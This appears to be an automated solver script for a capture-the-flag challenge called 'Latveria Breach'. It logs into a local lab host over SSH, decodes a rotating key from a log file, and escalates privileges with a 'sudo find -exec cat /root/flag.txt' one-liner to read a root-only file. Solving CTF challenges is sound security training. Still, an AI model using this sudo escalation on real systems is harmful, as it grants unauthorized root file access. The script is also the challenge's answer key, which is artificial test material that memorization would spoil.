#!/usr/bin/env python3
"""
solve.py — Automated Solver for Challenge 13: Latveria Breach
"""
import base64
import re
import sys
import time
import pexpect

def solve(host="127.0.0.1", port=2229, user="intruder", password="doom_is_master"):
    print(f"[*] Connecting to {host}:{port} as {user}...")
    child = pexpect.spawn(
        f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {port} {user}@{host}",
        timeout=20
    )
    child.expect("password:")
    child.sendline(password)
    child.expect(r"intruder@[a-zA-Z0-9]+:[^#\$]*[\$#]")
    print("[+] SSH login successful!")

    # Read the intercepted transmission log
    print("[*] Retrieving rotating key from /var/log/latveria_intercept.log...")
    raw_token = None
    for _ in range(35):
        child.sendline("cat /var/log/latveria_intercept.log")
        child.expect(r"intruder@[a-zA-Z0-9]+:[^#\$]*[\$#]")
        log_output = child.before.decode(errors="ignore")
        match = re.search(r"KEY ROTATED ->\s*(\S+)", log_output)
        if match:
            raw_token = match.group(1)
            break
        time.sleep(1)

    if not raw_token:
        print("[-] Could not find rotating key in transmission log.")
        child.sendline("exit")
        sys.exit(1)

    # Reverse string and base64 decode
    decoded_key = base64.b64decode(raw_token[::-1]).decode("utf-8").strip()
    print(f"[+] Decoded vault key: {decoded_key}")

    # Trigger the vault
    print("[*] Accessing ~/vault with decoded key...")
    child.sendline("./vault")
    child.expect("Enter decryption key:", timeout=15)
    child.sendline(decoded_key)
    child.expect(r"intruder@[a-zA-Z0-9]+:[^#\$]*[\$#]", timeout=30)
    print("[+] Vault accessed. Defense grid armed.")

    # Escalate privileges via sudo find
    print("[*] Exploiting sudo find to extract /root/flag.txt...")
    child.sendline("sudo /usr/bin/find . -exec cat /root/flag.txt \\; -quit")
    child.expect(r"intruder@[a-zA-Z0-9]+:[^#\$]*[\$#]")
    flag_output = child.before.decode(errors="ignore")

    flag_match = re.search(r"(YUVA\{[^}]+\})", flag_output)
    if not flag_match:
        print("[-] Failed to capture flag via sudo find.")
        child.sendline("exit")
        sys.exit(1)

    flag = flag_match.group(1)
    print(f"[+] Recovered root override flag: {flag}")

    # Disarm the defense grid
    print("[*] Submitting override flag to disarm defense grid...")
    child.sendline("./abort_destruct")
    child.expect("ENTER ROOT-LEVEL OVERRIDE FLAG:")
    child.sendline(flag)
    child.expect(r"intruder@[a-zA-Z0-9]+:[^#\$]*[\$#]")
    disarm_output = child.before.decode(errors="ignore")

    if "DEFENSE GRID DISARMED" in disarm_output:
        print(f"[+] SUCCESS! DEFENSE GRID DISARMED. FLAG: {flag}")
        child.sendline("exit")
        return flag
    else:
        print("[-] Grid disarm failed.")
        child.sendline("exit")
        sys.exit(1)

if __name__ == "__main__":
    solve()
